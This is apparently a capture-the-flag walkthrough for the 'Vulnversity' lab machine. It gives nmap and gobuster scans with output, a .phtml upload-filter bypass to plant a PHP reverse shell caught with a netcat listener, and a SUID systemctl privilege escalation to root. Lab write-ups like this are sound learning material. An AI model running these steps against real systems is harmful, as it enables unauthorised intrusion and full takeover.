@@ -1,0 +1,109 @@
+
+
+NMAP SCAN:
+
+sudo nmap -sV -sC -Pn -oA vulnversity  10.10.147.59
+
+Result:
+
+Nmap scan report for 10.10.147.59
+Host is up (0.17s latency).
+Not shown: 994 closed ports
+PORT     STATE SERVICE     VERSION
+21/tcp   open  ftp         vsftpd 3.0.3
+22/tcp   open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.7 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 5a:4f:fc:b8:c8:76:1c:b5:85:1c:ac:b2:86:41:1c:5a (RSA)
+|   256 ac:9d:ec:44:61:0c:28:85:00:88:e9:68:e9:d0:cb:3d (ECDSA)
+|_  256 30:50:cb:70:5a:86:57:22:cb:52:d9:36:34:dc:a5:58 (ED25519)
+139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
+445/tcp  open  netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
+3128/tcp open  http-proxy  Squid http proxy 3.5.12
+|_http-server-header: squid/3.5.12
+|_http-title: ERROR: The requested URL could not be retrieved
+3333/tcp open  http        Apache httpd 2.4.18 ((Ubuntu))
+|_http-server-header: Apache/2.4.18 (Ubuntu)
+|_http-title: Vuln University
+Service Info: Host: VULNUNIVERSITY; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
+
+Host script results:
+|_clock-skew: mean: 1h20m26s, deviation: 2h18m34s, median: 26s
+|_nbstat: NetBIOS name: VULNUNIVERSITY, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
+| smb-os-discovery: 
+|   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)
+|   Computer name: vulnuniversity
+|   NetBIOS computer name: VULNUNIVERSITY\x00
+|   Domain name: \x00
+|   FQDN: vulnuniversity
+|_  System time: 2021-04-20T04:38:12-04:00
+| smb-security-mode: 
+|   account_used: guest
+|   authentication_level: user
+|   challenge_response: supported
+|_  message_signing: disabled (dangerous, but default)
+| smb2-security-mode: 
+|   2.02: 
+|_    Message signing enabled but not required
+| smb2-time: 
+|   date: 2021-04-20T08:38:13
+|_  start_date: N/A
+
+
+WE SEE AN HTTP SERVER RUNNING ON PORT 3333.
+SO WE USE GOBUSTER TO BRUTEFORCE FILES AND DIRECTORIES .
+
+GOBUSTER SCAN:
+
+gobuster dir -u http://10.10.147.59:3333 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 100
+
+Result:
+
+===============================================================
+Gobuster v3.0.1
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
+===============================================================
+[+] Url:            http://10.10.147.59:3333
+[+] Threads:        100
+[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+[+] Status codes:   200,204,301,302,307,401,403
+[+] User Agent:     gobuster/3.0.1
+[+] Timeout:        10s
+===============================================================
+2021/04/20 14:16:04 Starting gobuster
+===============================================================
+/images (Status: 301)
+/css (Status: 301)
+/js (Status: 301)
+/fonts (Status: 301)
+/internal (Status: 301)
+/server-status (Status: 403)
+===============================================================
+2021/04/20 14:22:21 Finished
+===============================================================
+
+
+THE INTERNAL PAGE PROVIDES FILE UPLOAD FUNCTIONALITY ,BY TINKERING A BIT WE FIND THAT THE PAGE BLOCKS CERTAIN FILE UPLOADS SUCH AS PHP,JS ,PY,PDF,TXT .
+BUT DOSEN'T BLOCK PAGE WITH PHTML EXTENSION.WHICH IS A PHP FILE WHICH IS PARSED SERVER SIDE AND EXECUTED BY PHP ENGINE.
+NOW WE UPLAOD PHP REVERSE SHELL WITH EXTENSION OF PHTML.
+NOW IF WE CALL THE PAGE THROUGH IT'S URL  : http://<ip?:333/internal/uploads/php_reverse_shell.phtml 
+
+AND LISTEN ON OUR COMPUTER USING NETCAT : nc -lvnp 4444
+
+WE GET A REVERSE SHELL.
+
+PREVILAGE ESCALATION :
+
+run : find / -perm +4000 2> /dev/null
+
+WE SEE THAT /bin/systemctl HAS SETUID SET
+
+SO WE USE THAT FOR PREVILAGE ESCALATION
+
+CREATE A FILE CALLED ROOT.SERVICE
+
+THEN RUN : /bin/systemctl enable ./root.service                   AT THE SAME TIME LISTEN USING NETCAT 
+
+			/bin/systemctl start root                               nc -lvnp 4444
+
+
+THAT'S IT WE GET A ROOT SHELL RUN whoami TO CONFIRM
